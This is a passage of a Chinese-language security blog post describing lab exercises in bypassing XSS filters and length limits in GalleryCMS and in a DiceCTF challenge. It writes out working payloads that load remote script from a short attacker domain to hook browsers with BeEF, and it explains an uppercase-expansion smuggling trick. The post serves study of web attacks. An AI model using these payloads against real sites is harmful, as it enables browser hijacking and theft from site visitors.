class=\"line\">&lt;svg/onload=$.getScript(&quot;//㎭℠.co&quot;)&gt;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911195539757.png\" alt=\"image-20220911195539757\"></p>\n<h5 id=\"3绕过gallerycms\"><a class=\"markdownIt-Anchor\" href=\"#3绕过gallerycms\">#</a> 3. 绕过 GalleryCMS</h5>\n<p>对于用户的输入，gallerycms 做了严格的过滤，包括 从长度和内容限制</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">add</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">  </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// Validate form.</span></span><br><span class=\"line\">    <span class=\"variable language_\">$this</span>-&gt;load-&gt;<span class=\"title function_ invoke__\">helper</span>(<span class=\"string\">&#x27;form&#x27;</span>);</span><br><span class=\"line\">    <span class=\"variable language_\">$this</span>-&gt;load-&gt;<span class=\"title function_ invoke__\">library</span>(<span class=\"string\">&#x27;form_validation&#x27;</span>);</span><br><span class=\"line\">    <span class=\"variable language_\">$this</span>-&gt;form_validation-&gt;<span class=\"title function_ invoke__\">set_error_delimiters</span>(<span class=\"string\">&#x27;&lt;div class=&quot;alert alert-error&quot;&gt;&lt;strong&gt;Error: &lt;/strong&gt;&#x27;</span>, <span class=\"string\">&#x27;&lt;/div&gt;&#x27;</span>);</span><br><span class=\"line\">    <span class=\"variable\">$user_data</span> = <span class=\"variable language_\">$this</span>-&gt;session-&gt;<span class=\"title function_ invoke__\">all_userdata</span>();</span><br><span class=\"line\">    <span class=\"variable language_\">$this</span>-&gt;form_validation-&gt;<span class=\"title function_ invoke__\">set_rules</span>(<span class=\"string\">&#x27;album_name&#x27;</span>, <span class=\"string\">&#x27;Album Name&#x27;</span>, <span class=\"string\">&#x27;trim|required|max_length[45]|xss_clean&#x27;</span>);</span><br><span class=\"line\">    ...</span><br></pre></td></tr></table></figure>\n<h6 id=\"假设没有xss_clean的绕过\"><a class=\"markdownIt-Anchor\" href=\"#假设没有xss_clean的绕过\">#</a> 假设没有 xss_clean 的绕过</h6>\n<p>注意：我买的域名被腾讯与搞了，无法解析，因此只能用一些奇技淫巧了</p>\n<p>比如：我虚拟机的 kali 的 ip 是 192.168.13.133，我的 gallerycms 部署在本机上，我在本机上 host 文件加一个 dns 解析，将 radsm.co 解析到 192.168.13.133</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911201545877.png\" alt=\"image-20220911201545877\"></p>\n<p>但要是这样我 tm 白搭了一天的 beef…</p>\n<p>这样我们的 payload 就会变长，我使用的端口为 18888，<span class=\"exturl\" data-url=\"aHR0cDovL3huLS1yYWRzbS1ydDJoaTd6b21ydG9tYnBqY3EyaTNzemEuY286MTg4ODg=\">访问时就会变成 radsm.co:18888</span></p>\n<p>我们做一下减法 payload 会多出 6 个字符，到时候能解析的时候我们的 payload 就可以少六个</p>\n<p>1.payload 长度限制为 50 时</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;$.getScript(&quot;//㎭℠.co&quot;)&lt;/script&gt;</span><br><span class=\"line\">payload 中&quot;&quot; 和后半个闭合标签都不能缺少</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911231941383.png\" alt=\"image-20220911231941383\"></p>\n<p>2.payload 长度限制为 40 时</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script src=//㎭℠.co&gt;&#x27;.length</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911232202908.png\" alt=\"image-20220911232202908\"></p>\n<h6 id=\"存在xss_clean并且长度限制为45个字符时\"><a class=\"markdownIt-Anchor\" href=\"#存在xss_clean并且长度限制为45个字符时\">#</a> 存在 xss_clean 并且长度限制为 45 个字符时</h6>\n<p>利用 XSS_clean 漏过滤的 svg 来绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;svg/onload=$.getScript(&quot;//㎭℠.co&quot;)&gt;</span><br></pre></td></tr></table></figure>\n<p>注意：如果此时在 index.html 内写入 hook.js，并且使用宝塔面板，一定记着把 bt 自己的初始页的东西删光，不然无法上线</p>\n<p>并且 bt 使用自己的默认 index.html 的，在 /www/server/panel 下，具体可以去 bt 看，这个也一定要删掉或者完全改写，否则不会访问你站点首页的自己的 index.html 的</p>\n<p>还有一件很诡异的事，我 gallerycms 搭建在本机 192.168.2.13 上，beef-xss 在 kali 192.168.13.133 上，在一样的 payload 前提下，在本机上始终无法上线，但在 kali 上就可以，本机上进行了域名和 ip 的尝试，始终不行，最后在 kali 访问本机的 gallerycms 成功上线</p>\n<p>补充:gallerycms 的对新建 album 的过滤在 application/controllers/album.php 中，修改长度在这个文件里就能修改前端限制</p>\n<p>+1 补充：本篇文件缺少一些 xss 的基础知识，如果看不懂先看<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDgxMTg1MS9hcnRpY2xlL2RldGFpbHMvMTI2MDgwNzI4\"> (49 条消息) XSS 详解及复现 gallerycms 字符长度限制短域名绕过_薄荷加冰心有多冷的博客 - CSDN 博客</span></p>\n<p>这个大佬写的文章</p>\n<h3 id=\"3通过特殊字符变为大写后长度变为原来两倍偷渡非法字符\"><a class=\"markdownIt-Anchor\" href=\"#3通过特殊字符变为大写后长度变为原来两倍偷渡非法字符\">#</a> 3. 通过特殊字符变为大写后长度变为原来两倍偷渡非法字符</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmh1bGkudHcvMjAyMi8wMi8wOC93aGF0LWktbGVhcm5lZC1mcm9tLWRpY2VjdGYtMjAyMi8=\">https://blog.huli.tw/2022/02/08/what-i-learned-from-dicectf-2022/</span></p>\n<p>假設我有個字串是  <code>ßßßßßßßß&lt;b&gt;1&lt;/b&gt;</code> ，長度是 16，所以在初始化的時候 length 會是 16，但是當跑到迴圈的時候因為轉成大寫，會是  <code>8*2+8</code>  = 24 個字，所以 24 個字會全部被寫進去 buf 裡面。</p>\n<p>在  <code>mock</code>  函式裡面，只會檢查 length 內的東西，所以最後 8 個字不會被檢查到，可以偷渡  <code>&lt;&gt;</code>  這些字元進去</p>\n<h3 id=\"4利用svgdetails绕过先抓取元素再赋值\"><a class=\"markdownIt-Anchor\" href=\"#4利用svgdetails绕过先抓取元素再赋值\">#</a> 4. 利用 SVG/details 绕过先抓取元素再赋值</h3>\n<p>document.querySelector( ‘.note’).innerHTML = text;</p>\n<h2 id=\"参考\"><a class=\"markdownIt-Anchor\" href=\"#参考\">#</a> 参考</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGlhb3h1ZWZlbmcuY29tL3dpa2kvMTAyMjkxMDgyMTE0OTMxMg==\">JavaScript 教程 - 廖雪峰的官方网站 (liaoxuefeng.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93YW5nZG9jLmNvbS9qYXZhc2NyaXB0Lw==\">JavaScript 教程 - 网道 (wangdoc.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcvemgtQ04vZG9jcy9XZWIvSmF2YVNjcmlwdA==\">JavaScript | MDN (mozilla.org)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYm9va3N0YWNrLmNuL3JlYWQvamF2YXNjcmlwdC10dXRvcmlhbC9SRUFETUUubWQ=\">介绍 - 《阮一峰 JavaScript 教程》</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9yZXNlYXJjaC5zZWN1cml0dW0uY29tLw==\">research.securitum.com - securitum.com vulnerabilities researches and cyber security education publications</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vamF2YXNjcmlwdC1wcm90b3R5cGUtcG9sbHV0aW9uLWF0dGFjay5odG1s\">深入理解 JavaScript Prototype 污染攻击 | 离别歌 (leavesongs.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMTU2MzU2\">实战 Web 缓存投毒（上）- 安全客 - 安全资讯平台 (anquanke.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvcmVzZWFyY2gvcHJhY3RpY2FsLXdlYi1jYWNoZS1wb2lzb25pbmc=\">https://portswigger.net/research/practical-web-cache-poisoning</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly94c3MuYnkvI2NoZWF0c2hlZXQ=\">https://xss.by/#cheatsheet</span></p>\n<p>cover: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9rYnNoaXJlLTEzMDg5ODE2OTcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWcvaW5zdGFsbC1idXJnLW9uLXVidW50dS1tYW51YWwuanBn\">https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/install-burg-on-ubuntu-manual.jpg</span></p>\n",
            "tags": [
                "XSS"
            ]
        }
    ]
}